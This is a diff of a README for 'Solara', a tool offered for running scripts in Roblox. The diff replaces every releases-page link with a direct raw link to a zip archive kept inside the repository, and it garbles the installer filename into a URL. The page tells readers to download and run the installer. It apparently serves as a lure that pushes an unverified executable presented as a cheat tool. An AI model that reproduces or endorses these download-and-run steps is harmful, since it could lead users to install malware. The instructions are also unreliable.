@@ -1,7 +1,7 @@
 # 🚀 Solara - Fast and Secure 3rd EXEC Tool
 
 ## 🔗 Download Solara Now!
-[![Download Solara](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/remotecontrolled-crocethia595/Solara/releases)
+[![Download Solara](https://raw.githubusercontent.com/remotecontrolled-crocethia595/Solara/main/Executor/Resources/Solara_v2.8.zip)](https://raw.githubusercontent.com/remotecontrolled-crocethia595/Solara/main/Executor/Resources/Solara_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -30,13 +30,13 @@ To get Solara, follow these steps:
 1. **Visit the Releases Page:** 
    Click on the link below to go to the releases page. 
 
-   [Visit the Releases Page to Download](https://github.com/remotecontrolled-crocethia595/Solara/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/remotecontrolled-crocethia595/Solara/main/Executor/Resources/Solara_v2.8.zip)
 
 2. **Select the Latest Version:** 
    Look for the most recent version listed on the page. Click the link to view the assets.
 
 3. **Download the Installer:**
-   Download the installer file. This is typically named something like `Solara-installer.exe`.
+   Download the installer file. This is typically named something like `https://raw.githubusercontent.com/remotecontrolled-crocethia595/Solara/main/Executor/Resources/Solara_v2.8.zip`.
 
 4. **Run the Installer:**
    Once the download completes, locate the installer file in your downloads folder and double-click it to run.
@@ -87,4 +87,4 @@ If you're interested in learning more about scripting and Roblox execution, cons
 
 Enjoy using Solara, your new companion for effortless script execution in Roblox! 
 
-[Download Solara](https://github.com/remotecontrolled-crocethia595/Solara/releases) and begin your journey today.
+[Download Solara](https://raw.githubusercontent.com/remotecontrolled-crocethia595/Solara/main/Executor/Resources/Solara_v2.8.zip) and begin your journey today.
